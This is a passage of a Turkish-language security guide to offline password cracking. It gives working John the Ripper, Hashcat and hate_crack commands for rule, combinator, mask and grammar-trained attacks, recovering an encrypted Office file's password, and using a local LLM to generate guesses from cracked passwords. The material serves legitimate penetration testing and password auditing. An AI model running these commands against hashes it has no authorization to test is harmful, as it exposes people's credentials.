- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Wordlist Oluşturma Araçları**

- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Yapılandırılabilir temel karakterler, klavye düzeni ve rotalarla gelişmiş keyboard-walk oluşturucusu.

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### John mutation

_**/etc/john/john.conf**_ dosyasını okuyup yapılandırın.

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Hashcat saldırıları

- **Wordlist saldırısı** (`-a 0`) rules ile

**Hashcat**, **rules içeren bir klasörle** birlikte gelir ancak [**burada başka ilgi çekici rules bulabilirsiniz**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### Kural dosyalarını açıklama ve profilleme

Hashcat kuralları opcode'ları soldan sağa yürütür. İşlemler sıfırıncı konumda uygulandığında bunu yanlış yorumlamak kolaydır: `^e ^h ^t`, önce `e`, sonra `h`, ardından `t` ekler ve böylece `password` sözcüğünü `thepassword` olarak değiştirir. Değiştirmeler büyük/küçük harfe duyarlı bayt karşılaştırmalarıdır; bu nedenle `sa@` gibi bir kural, büyük harfli `A` için işlem yapmaz. Alışılmadık kuralları GPU zamanı harcamadan önce küçük harfli, büyük harfli ve büyük-küçük harf karışık örnek temel sözcüklerle test edin.<sup>[[6]](#references)[[9]](#references)</sup>

[HashcatRosetta](https://github.com/bandrel/HashcatRosetta), her ara adayı gösterebilir ve eksiksiz bir kural dosyasındaki opcode dağılımını özetleyebilir. Statik opcode sayımları, dosyanın çoğunlukla karakter ekleyip eklemediğini, başa karakter ekleyip eklemediğini, karakterleri değiştirip değiştirmediğini veya karakterleri kesip kesmediğini ortaya çıkarır. Bunlar bir kuralın parolayı kıracağını kanıtlamaz; ancak hedef kitlenin gözlemlenen parola kalıplarıyla eşleşen bir kural kümesi seçmeye yardımcı olur.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### Debug loglarıyla yinelenen kuralları azaltma

Hashcat debug modu, kural dönüşümlerini normal durum ve sonuç çıktısından ayrı kaydeder. Mod `4`, `temelkelime:kural:aday` yazar; mod `5` ise kaynak kelime listesini ekler. Her zaman `--debug-file` seçeneğini açıkça belirtin. Aksi takdirde Hashcat, profil dizinindeki `hashcat.debugfile` dosyasını açar ve stdout'u yönlendirmek bu kayıtlar yerine konsol akışını yakalar. Debug dosyaları ekleme modunda açılır; bu nedenle yeni bir ölçüm yapmadan önce eski dosyayı silin veya döndürün ve düz metin temel kelimeler ile adaylar içerdiği için dosyayı koruyun.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

`frequency` değerini en sık uygulanan kuralları bulmak, `basewords` değerini farklı girdi kapsamını ölçmek ve `candidates` değerini farklı çıktıları saymak için kullanın. Kural sık uygulanıyor olsa bile birçok girdiyi yinelenen adaylara dönüştürebileceğinden, adayları sıralamak genellikle azaltma işlemine başlamak için en iyi yoldur. En değerli kuralları daha küçük bir dosyaya kopyalayın, bu dosyayı kalan hash’ler üzerinde yeniden çalıştırın ve çalıştırmaların raporlarını karşılaştırın. Mode `5`, her kaynak wordlist’in yararlı basewords sağlayıp sağlamadığını da gösterir; verilerdeki iki nokta üst üste işaretleri otomatik algılamayı belirsiz kıldığında ayrıştırmayı zorlamak için `--debug-mode 4` veya `--debug-mode 5` kullanın.<sup>[[6]](#references)[[9]](#references)</sup>

- **Wordlist combinator** saldırısı

hashcat ile **2 wordlist’i tek bir wordlist’te birleştirmek** mümkündür.\
İlk listede **"hello"** sözcüğü, ikincisinde ise **"world"** ve **"earth"** sözcüklerinin bulunduğu 2 satır olduğunu varsayalım. `helloworld` ve `helloearth` sözcükleri oluşturulur.

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Grammar-driven combinator attacks (encrypted Office example)

Bir parola uzun olabilir ve birkaç karakter sınıfı içerebilir; ancak bilinen bir dilbilgisini izliyorsa **etkin arama uzayı** yine de küçük olabilir. Yetkili bir değerlendirme sırasında elde edilen şifrelenmiş bir Office belgesi için `office2john.py`, parola doğrulama kaydını çıkarır; bu sayede çevrimiçi kilitlenme, hız sınırlaması veya MFA olmadan yerel parola tahmini yapılabilir. Belge şifrelemesini aşmaz.<sup>[[2]](#references)[[5]](#references)</sup>

Hashcat'in yalnızca doğrulayıcıyı alması için John'ın başa eklediği dosya adı alanını çıkarın:<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

`-m` seçimini dosya uzantısına göre değil, çıkarılan prefix'e göre yapın. Hashcat, `$office$*2007*`, `$office$*2010*` ve `$office$*2013*` değerlerini sırasıyla `9400`, `9500` ve `9600` modlarına eşler; eski `$oldoffice$0/$1` ve `$oldoffice$3/$4` kayıtları ise sırasıyla `9700` ve `9800` modlarını kullanır.<sup>[[3]](#references)</sup>

Password reuse, policies, hints veya kullanıcıyı tanıyan kişilerden edinilen bilgiler `<word><number><optional !><word>` gibi bir grammar ortaya koyuyorsa, bağımsız olarak enumerate edilebilen prefix'i sol sözlük olarak oluşturun. Bu örnekte `0` ile `99` arasındaki sayılar test edilir; aralığı ve dönüşümleri değerlendirmeden elde edilen kanıtlara göre değiştirin.<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

Hashcat attack mode `1`, sağdaki dictionary’deki her satırı soldaki dictionary’deki her satıra ekler; böylece dosyalarda sırasıyla `L` ve `R` satır varsa, uygulanan kurallardan önce `L × R` aday oluşturulur. Aşağıdaki komut özellikle eski bir `$oldoffice$3/$4` kaydı içindir; diğer Office biçimleri için modu değiştirin.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

Bu ön işleme kalıbı, çevrimdışı doğrulanabilen diğer biçimlere de uygulanabilir: olası büyük/küçük harf kullanımlarını, tarihleri, ayraçları, rakamları veya noktalama işaretlerini yalnızca tek bir bileşen için sıralayın, ardından nominal tam uzunluğu brute-force etmek yerine bunu kalan bileşenle birleştirin.<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### Çalıştırmadan önce `.hcmask` dosyalarını doğrulayın

Hatalı bir satır geçerli maskelerin arasında gözden kaçabilir. Bu nedenle saldırıyı başlatmadan önce dosyanın tamamını ve tahmini anahtar uzayını doğrulayın. HashcatRosetta, hatalı satırı bildirir ve maskelerden herhangi biri geçersiz olduğunda sıfır olmayan bir durum kodu döndürür. Bu sayede kontrol, betikler veya CI için uygundur.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

Maske dosyalarını genel amaçlı CSV veya metin ayrıştırıcılarıyla normalize etmeyin. Hashcat, `?1` ile `?8` arasındaki özel karakter kümelerini destekler, `#` karakterini yalnızca ilk bayt olduğunda yorum satırı olarak kabul eder ve `?` belirteçlerini yorumlamadan önce ters eğik çizgi kaçışlarını tek geçişte kaldırır. Bu nedenle `#` öncesindeki baştaki boşluklar maske verisidir ve kaçış karakterleri bir dizinin sabit metin mi yoksa karakter kümesi belirteci mi olduğunu değiştirebilir.<sup>[[6]](#references)[[9]](#references)</sup>

- Kelime listesi + Maske (`-a 6`) / Maske + Kelime listesi (`-a 7`) saldırısı

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### hate_crack ile hedefe göre eğitilmiş Hashcat denemeleri

[hate_crack](https://github.com/trustedsec/hate_crack), bir hash dosyanız ve Hashcat modunu biliyor olmanız koşuluyla yerel Hashcat denemelerini yönetir. Hashcat'in ayrıca yüklenmesi gerekir. Submodule'larla klonlayın, `make` komutunu çalıştırın ve ardından etkileşimli bir oturum başlatın; örnek `1000` modu NTLM içindir, evrensel bir varsayılan değildir. Mevcut klonlarda PCFG ve PRINCE-LING seçeneklerini kullanmadan önce `git submodule update --init --recursive` komutunu çalıştırın.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**Kurtarılan düz metinlerden bir gramer öğrenin.** Önce bir sözlük/kural geçişi çalıştırın, ardından hedefle ilgili düz metinlerle `pcfg_cracker`'ı eğitin. `config.json` dosyasında `pcfgRuleset`'i eğitilmiş ruleset'e ayarlayın ve olası yapıları Hashcat'e aktarmak için PCFG'yi (menü `20`), ya da gramer rehberliğinde bir PRINCE temel listesi oluşturmak için PRINCE-LING'i (`21`) seçin. İki üreticiyi `pcfgMaxCandidates` ve `pcfgPrinceLingMaxCandidates` ile sınırlandırın; hate_crack grameri sizin için eğitmez. PCFG, [combinator örneğindeki](#grammar-driven-combinator-attacks-encrypted-office-example) sabit gramerin aksine, temel kelime artı rakamlar ve semboller gibi yapıların olasılığını öğrenir.<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**Bilinen parolalardan geriye doğru rule çıkarın.** Spoonman (menü `22`), geçerli oturumun boş olmayan `.out` dosyası da dahil olmak üzere düz metinlerden oluşan bir derlemi alır ve gözlemlenen parolaları yeniden oluşturabilecek küçük harfli baseword'ler ve Hashcat rule'ları türetir. Rule'ları, derlemdeki kaç parolayı ürettiklerine göre sıralar. En yüksek %50 kapsama sağlayan katmanla başlayın ve yalnızca eklenen keyspace gerekçelendirilebiliyorsa kapsamı genişletin; eksik stem kapsama alanını, mutasyon değil de sınırlıyorsa, türetilen baseword'leri diğer ilgili wordlist'lerle birleştirin. Hashcat, rule başına en fazla 31 işlev kabul eder ve konum alfabesi yalnızca `0`–`35` indekslerini adresler; parola kodlanamadığında Spoonman, olduğu gibi bir baseword ve no-op rule kullanır. Çok büyük derlemler, sınırlı bellek sayaç sınırına takılabilir; bu nedenle tam yeniden oluşturma yapıldığını varsaymak yerine bildirilen kapsama oranını kontrol edin. Çıktıyı bağımsız olarak yeniden kullanmadan önce [Hashcat rule davranışı](#explain-and-profile-rule-files) bölümüne bakın.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**Eldeki kanıta uygun bir generator seçin.** OMEN (`13`), bir parola listesinden karakter geçiş modeli eğitir ve adayları olasılık sırasına göre, `omenMaxCandidates` ile belirlenen sınıra kadar listeler. Markov brute force (`15`) bunun yerine geçerli `.out` dosyasındaki crack edilmiş parolalardan veya seçilmiş bir listeden `.hcstat2` tablosu oluşturabilir ve artımlı uzunluk aralığını deneyebilir. Hedefle ilgili bilgiler parola yerine düzyazı biçimindeyse N-gram (`16`), gzip girdisi de dahil olmak üzere bir derlemi `ngramX.bin` dosyasına aktarır; varsayılan grup boyutu üçtür. Bunlar, aynı aday listesinin üç kopyası değil, birbirine alternatif yöntemlerdir.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**Yalnızca küçük ve makul havuzları genişletin.** Permutation (`17`), her girdi kelimesindeki tüm karakterleri yeniden sıralar; bu nedenle sekiz karakterli tek bir kelime bile `8!` sıralama üretir. Combipow (`19`), kısa bir passphrase kelime havuzundaki boş olmayan alt kümelerin kombinasyonlarını üretir; `-s` boşluk ekler ve araç 63'ten fazla girdi satırını reddeder. Combinator (`6`), `--sepFill` ile birden fazla wordlist'i ayraçlarla birleştirebilir; iki listeyi sıradan biçimde birleştirme işlemi yukarıdaki [yerel Hashcat combinator](#hashcat-attacks) tarafından karşılanır.<sup>[[13]](#references)[[14]](#references)</sup>

**Geri bildirim saldırılarına bütçe ayırın.** Fingerprint (`5`), her turda tüm derlemi yeniden genişletmek yerine, yeni crack edilmiş parolaları parça uzunluğunu artırarak yinelemeli biçimde genişletir; kombinasyon keyspace eşiği, aşırı büyük bir `-a 1` geçişini atlar. Hybrid (`7`), daha geniş `?a` öne/sona ekleme maskelerinden önce daha ucuz `?s?d` eklemelerini dener; `hcatHybridMaxRuntime` çalıştırma süresini sınırlar. Bu önemlidir; çünkü hybrid geçişinin maliyeti wordlist boyutunun maske alanıyla çarpımına bağlıdır ve büyük bir listeye uygulanan geniş bir maske, ilk geçişlerin maliyetini çok aşabilir.<sup>[[13]](#references)[[14]](#references)</sup>

**Kurtarılan parolalardan yerel LLM ile adaylar üretin.** İlk geçiş boş olmayan bir `<hashfile>.out` dosyası oluşturduktan sonra, hate_crack'in LLM saldırısı (ana menü `12`, **Crack edilmiş parolalar** alt menüsü `3`) hedefe özgü baseword'leri, yılları, sonekleri ve büyük-küçük harf kullanımını tahmin edebilir, ardından yeni adayları Hashcat'e gönderebilir. Küçük derlemlerde kurtarılan düz metinler model istemine eklenebilir; daha büyük derlemler ise bunun yerine istatistiklere dönüştürülerek özetlenir. Bu yöntem, yalnızca yukarıdaki sabit [rule'ları](#explain-and-profile-rule-files) veya [maskeleri](#hashcat-attacks) yeniden denemek yerine, gözlemlenen kullanım alışkanlıklarını geneller.<sup>[[13]](#references)[[14]](#references)</sup>

hate_crack'in `.env` dosyasında önceden sunulmakta olan yerel bir Ollama modelini yapılandırın; araç modeli otomatik olarak indirmez. `OLLAMA_NO_CLOUD=true`, cloud etiketli modelleri ve site dışındaki endpoint adreslerini reddeder. Yalnızca localhost endpoint'i kullanmak yeterli değildir: Ollama, `-cloud` modeline uzaktan proxy uygulayabilir ve istemlerde kurtarılan düz metinler veya derlem istatistikleri bulunabilir. Bu ayar özel ağ endpoint'lerine yine de izin verir ve aktarım proxy'si olmadığını garanti edemez; bu nedenle istemci verilerini göndermeden önce çıkarım yolunu doğrulayın.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

Daha büyük bir bütçe ayırmadan önce aday verimini daha ucuz rule, mask ve hedefe göre eğitilmiş denemelerle karşılaştırın. Model tahminler üretir; Hashcat bunları hash'lere karşı test etmeye devam eder.<sup>[[13]](#references)[[14]](#references)</sup>

#### Hashcat modları

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Linux Hash Cracking - /etc/shadow dosyası

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Windows Hash'lerini Kırma

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

Yaygın Uygulama Hash'lerini Kırma

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

## References

- [1] [GoBruteforcer’ın İçinden: AI tarafından oluşturulan sunucu varsayılanları, zayıf parolalar ve kripto odaklı kampanyalar](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Hashcat örnek hash’leri ve Microsoft Office modları](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Hashcat birleştirme saldırısı](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [Kimlik bilgilerinin miras planlaması](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [HashcatRosetta deposu](https://github.com/bandrel/HashcatRosetta)
- [7] [Hashcat debug-file uygulaması](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Hashcat komut satırı yardımı](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta: Parola kırmanın Rosetta Taşı’nı okumak](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [PCFG Cracker deposu ve kullanımı](https://github.com/lakiw/pcfg_cracker)
- [11] [OMEN deposu ve kullanıcı kılavuzu](https://github.com/RUB-SysSec/OMEN)
- [12] [Spoonman’ın özgün sorunu ve kural türetme tasarımı](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [hate_crack deposu ve saldırı belgeleri](https://github.com/trustedsec/hate_crack)
- [14] [2.0’dan Bu Yana hate_crack’teki Yenilikler](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [hate_crack LLM hedef politikası](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
{{#include ../banners/hacktricks-training.md}}
